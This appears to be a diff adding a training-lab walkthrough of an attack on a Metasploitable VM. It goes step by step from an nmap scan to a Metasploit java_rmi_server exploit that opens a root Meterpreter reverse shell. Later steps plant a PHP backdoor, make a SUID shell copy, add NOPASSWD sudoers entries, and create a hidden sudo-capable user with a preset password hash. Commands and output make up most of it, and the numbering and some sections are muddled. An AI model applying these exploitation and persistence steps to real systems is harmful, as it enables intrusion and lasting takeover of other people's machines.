@@ -1,0 +1,312 @@
+
+1. Run NMAP Scan against Metasploitable VM
+2. Update the java_rmi_server metasploit module
+2. Search for the RMI Service
+3. Exploit the RMI Server and obtain root.
+4. Set up PHP meterpreter LISTENER
+
+5. Create SUID Backdoor
+6. Create SUDO BackDoor
+7. Create PHP reverse_tcp Meterpreter Backdoor
+8. Escalate Privilege with SUID Backdoor
+9. Escalate Privilege with SUDO Backdoor(s)
+10. Collect Lime Forensics Image of RMI exploit
+
+1. Run NMAP Scan against Metasploitable VM
+==========================================
+root@alice:~# pwd
+/root
+root@alice:~# nmap -sT -T4 -A 192.168.209.151 2>&1 | tee /root/portscan.txt
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-05 03:33 EDT
+Nmap scan report for 192.168.209.151
+Host is up (0.0035s latency).
+Not shown: 977 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.209.179
+
+
+1099/tcp open  java-rmi    Java RMI Registry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+
+2. java_rmi_server port open on victim
+===============================================
+root@alice:~# grep -i rmi portscan.txt
+1099/tcp open  java-rmi    Java RMI Registry
+root@alice:~# 
+
+3. Exploit the RMI Server and obtain root.
+=========================================
+msf exploit(multi/misc/java_rmi_server) > setg RHOST 192.168.209.151 
+RHOST => 192.168.209.151
+msf exploit(multi/misc/java_rmi_server) > run
+
+[*] Started reverse TCP handler on 192.168.209.179:4444 
+[*] 192.168.209.151:1099 - Using URL: http://0.0.0.0:8080/5EWBbQuMes8
+[*] 192.168.209.151:1099 - Local IP: http://192.168.209.179:8080/5EWBbQuMes8
+[*] 192.168.209.151:1099 - Server started.
+[*] 192.168.209.151:1099 - Sending RMI Header...
+[*] 192.168.209.151:1099 - Sending RMI Call...
+[*] 192.168.209.151:1099 - Replied to request for payload JAR
+[*] Sending stage (53837 bytes) to 192.168.209.151
+[*] Meterpreter session 1 opened (192.168.209.179:4444 -> 192.168.209.151:36208) at 2018-05-05 04:08:37 -0400
+[*] 192.168.209.151:1099 - Server stopped.
+
+meterpreter > getuid
+Server username: root
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(multi/misc/java_rmi_server) > sessions -i 1
+[*] Starting interaction with 1...
+
+4. Set up PHP meterpreter LISTENER
+===================================
+
+5. Interrogate victim machine
+===============================
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+ps -eaf |egrep "(http|apache)" |grep -v grep
+root      5284     1  0 Apr20 ?        00:00:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+root      5285  5284  0 Apr20 ?        00:00:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+tomcat55  5287  5284  0 Apr20 ?        00:06:06 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
+root      5305     1  0 Apr20 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data  7529  5305  0 Apr21 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data  7531  5305  0 Apr21 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data  7532  5305  0 Apr21 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data  7533  5305  0 Apr21 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  7534  5305  0 Apr21 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 10675  5305  0 Apr21 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 11226  5305  0 Apr21 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 14155  5305  0 02:21 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 14176  5305  0 02:21 ?        00:00:00 /usr/sbin/apache2 -k start
+
+6. Upload backdoor file onto victims machine: /var/www
+========================================================
+
+meterpreter > upload /root/metas2_backdoor.php /var/www/metas2_backdoor.php
+[*] uploading  : /root/metas2_backdoor.php -> /var/www/metas2_backdoor.php
+[*] Uploaded -1.00 B of 1.17 KiB (-0.08%): /root/metas2_backdoor.php -> /var/www/metas2_backdoor.php
+[*] uploaded   : /root/metas2_backdoor.php -> /var/www/metas2_backdoor.php
+meterpreter > pwd
+/var/www
+meterpreter > shell 
+Process 3 created.
+Channel 4 created.
+ls -l
+total 76
+drwxrwxrwt  2 root     root      4096 Apr 21 11:14 dav
+drwxr-xr-x  8 www-data www-data  4096 May 20  2012 dvwa
+-rw-r--r--  1 www-data www-data   891 May 20  2012 index.php
+-rw-r--r--  1 root     root      1198 Apr 22 07:37 metas2_backdoor.php
+drwxr-xr-x 10 www-data www-data  4096 May 14  2012 mutillidae
+drwxr-xr-x 11 www-data www-data  4096 May 14  2012 phpMyAdmin
+-rw-r--r--  1 www-data www-data    19 Apr 16  2010 phpinfo.php
+drwxr-xr-x  3 www-data www-data  4096 May 14  2012 test
+drwxrwxr-x 22 www-data www-data 20480 Apr 19  2010 tikiwiki
+drwxrwxr-x 22 www-data www-data 20480 Apr 16  2010 tikiwiki-old
+drwxr-xr-x  7 www-data www-data  4096 Apr 16  2010 twiki
+
+
+7. CHANGE PERMISSIONS FOR THE UPLOADED BACKDOOR FILE
+====================================================
+meterpreter > pwd
+/var/www
+meterpreter > shell 
+Process 3 created.
+Channel 4 created.
+ls -l
+total 76
+-rw-r--r--  1 root     root      1198 Apr 22 07:37 metas2_backdoor.php
+
+chmod 4777 metas2_backdoor.php
+ls -l
+total 76
+-rwsrwxrwx  1 root     root      1198 Apr 22 07:37 metas2_backdoor.php
+
+
+8. CREATE SUDO POWERS FOR BACKDOOR
+===================================
+===================================
+ps -eaf | grep apache2
+root      5305     1  0 Apr20 ?        00:00:02 /usr/sbin/apache2 -k start
+www-data 15098  5305  0 06:44 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 15103  5305  0 06:44 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 15105  5305  0 06:44 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 15108  5305  0 06:44 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 15111  5305  0 06:44 ?        00:00:00 /usr/sbin/apache2 -k start
+
+ls -l /etc/sudoers
+-r--r----- 1 root root 470 Mar 16  2010 /etc/sudoers
+
+9. NAVIGATE TO VICTIMs IP IN YOUR BROWSER
+=========================================
+Open Firefox
+
+Instructions:
+background
+Click on the FireFox Icon
+
+[*] Sending stage (37775 bytes) to 192.168.209.151
+[*] Meterpreter session 2 opened (192.168.209.179:4444 -> 192.168.209.151:56529) at 2018-05-05 16:23:53 -0400
+exit
+
+10. CREATE SUID Backdoor
+========================
+Instructions:
+
+cp `which sh` .backdoor
+ls -l .backdoor
+chmod 4777 .backdoor
+ls -l .backdoor
+
+/var/www
+
+cp `which sh` .backdoor_crafted
+ls -a
+.
+..
+.backdoor_crafted
+dav
+However we will use (chmod 4777) to grant full permissions to the user(rwx), 
+group(rwx), world(rwx).  In addition, we will set the SUID(4) bit on the root 
+user(rwx) permission to allow any user(e.g., www-data) to not only execute the 
+shell, but to gain an EUID (effective UserID) as root.  See SUID for more explanation.
+
+11. CREATE SUDO Backdoor
+===================
+ps -eaf | grep apache2
+ls -l /etc/sudoers
+echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers
+
+grep "www-data" /etc/sudoers
+www-data ALL=NOPASSWD: ALL
+exit
+
+12. NAVIGATE TO VICTIMs IP IN YOUR BROWSER
+=========================================
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(multi/handler) > sessions -l
+
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                    Information                     Connection
+  --  ----  ----                    -----------                     ----------
+  1         meterpreter java/linux  root @ metasploitable           192.168.209.179:4444 -> 192.168.209.151:36208 (192.168.209.151)
+  2         meterpreter php/linux   www-data (33) @ metasploitable  192.168.209.179:6666 -> 192.168.209.151:53221 (192.168.209.151)
+
+msf exploit(multi/handler) > sessions -i 2
+[*] Starting interaction with 2...
+
+pwd
+/var/www
+users
+msfadmin msfadmin root
+13. CREATING NEW USER
+=====================
+/usr/sbin/useradd -m -d /home/dojodone -c "noondi" -s /bin/bash dojodone
+
+grep dojodone /etc/passwd
+dojodone:x:1003:1003:noondi:/home/dojodone:/bin/bash
+
+grep dojodone /etc/shadow
+dojodone:!:17643:0:99999:7:::
+
+14. ADDING A PASSWORD FOR THE NEW USER: abc123
+=============================================
+sed -i 's/:!:/:$1$e4y.VI4o$ZT1dIDHhNMtaGS2xKAaQ90:/' /etc/shadow
+
+grep dojodone /etc/shadow
+dojodone:$1$e4y.VI4o$ZT1dIDHhNMtaGS2xKAaQ90:17643:0:99999:7:::
+
+echo "dojodone ALL=NOPASSWD: ALL" >> /etc/sudoers 
+
+grep "dojodone" /etc/sudoers
+dojodone ALL=NOPASSWD: ALL
+
+exit
+meterpreter > Interrupt: use the 'exit' command to quit
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(multi/handler) > show options
+msf exploit(multi/handler) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > shell
+Process 16153 created.
+Channel 0 created.
+  
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sudo su -
+stdin: is not a tty
+ 
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+sudo nano t.txt 2>/dev/null
+ls -l
+total 12
+drwxr-xr-x 2 root root 4096 2012-05-20 15:08 Desktop
+-rwx------ 1 root root  401 2012-05-20 15:55 reset_logs.sh
+-rw-r--r-- 1 root root  138 2018-04-20 23:02 vnc.log
+
+
+
+15. EXECUTING SUDO Backdoor #1
+=========================
+Instructions:
+shell
+id
+sudo su -
+id
+
+pwd
+/root
+sudo vi t.txt 2>/dev/null
+~
+~t.txt" [New File]
+:!/bin/sh
+~
+~
+~
+:!/bin/sh
+:q!
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+exit
+
+root@alice:~# ssh dojodone@192.168.209.151
+dojodone@192.168.209.151's password: 
+..... ... 
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+dojodone@metasploitable:~$ id
+uid=1003(dojodone) gid=1003(dojodone) groups=1003(dojodone)
+dojodone@metasploitable:~$ sudo su -
+root@metasploitable:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable:~# pwd
+/root
+
+
+
+
+
+
+
+
